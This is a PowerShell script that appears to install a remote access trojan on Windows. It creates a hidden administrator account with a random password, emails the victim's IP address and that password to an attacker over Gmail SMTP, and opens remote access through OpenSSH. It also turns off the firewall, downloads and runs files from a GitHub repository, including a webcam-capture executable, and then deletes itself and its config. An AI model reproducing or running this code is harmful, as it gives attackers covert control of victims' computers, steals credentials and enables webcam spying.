# random string for directory name
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin
function create_account {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin" 
        Write-Verbose "$NewLocalAdmin local user craeted" 
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin" 
        Write-Verbose "$NewLocalAdmin added to local administrators group"
    }
    end {

    }
}

# create admin user
Remove-localUser -Name "winlocal" -ErrorAction SilentlyContinue
$NewLocalAdmin = "winlocal"
$pword = random_text
$Password = (ConvertTo-SecureString $pword -AsPlainText -Force)
create_account -NewLocalAdmin $NewLocalAdmin -Password $Password

# variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location
$configfile = "$env:UserName.rat"
$email = Get-Content email.txt
$eword = Get-Content eword.txt
$ip = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null}).IPv4Address.IPAddress

# writes config file
Add-Content -Path $initial_dir/coller.cmd -Value "@echo off" 
Add-Content -Path $configfile -Value $ip
Add-Content -Path $configfile -Value $pword
Add-Content -Path $configfile -Value $path
Add-Content -Path $configfile -Value $initial_dir

# smtp process
Send-MailMessage -From $email -To $email -Subject $configfile -Attachment $configfile -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $eword -AsPlainText -Force))


# goto temp, make working directory
mkdir $path
Set-Location $path

# Self-elevate if not admin
if (-not ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole]::Administrator))
{
    Start-Process powershell.exe `
        -Verb RunAs `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic

Write-Host "OpenSSH Server installation completed."

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# registry to hide local admin
$reg_file = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/installer/files/Registry.reg -OutFile "$reg_file.reg"

# visual basic script to register the registry
$con_file = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/installer/files/confirm.vbs -OutFile "$con_file.vbs"

# install the registry
Invoke-Expression "./$reg_file.reg"; Invoke-Expression "./$con_file.vbs"

# ----
mkdir $env:temp/WCC
Set-Location $env:temp/WCC

Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/camcap/camcap.exe -OutFile "camcap.exe"

# visual basic script to register the registry
$concam_file = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/camcap/confirm-cam.vbs -OutFile "$concam_file.vbs"

# install the registry
Invoke-Expression "./camcap.exe"; Invoke-Expression "./$concam_file.vbs"
# ----

# hide WindowsGuest user
Set-Location C:\Users
attrib +h +s +r winlocal

# delete config file
Set-Location $initial_dir
Remove-Item -Path $configfile
Remove-Item email.txt
Remove-Item eword.txt

# self delete
Remove-Item installer.ps1
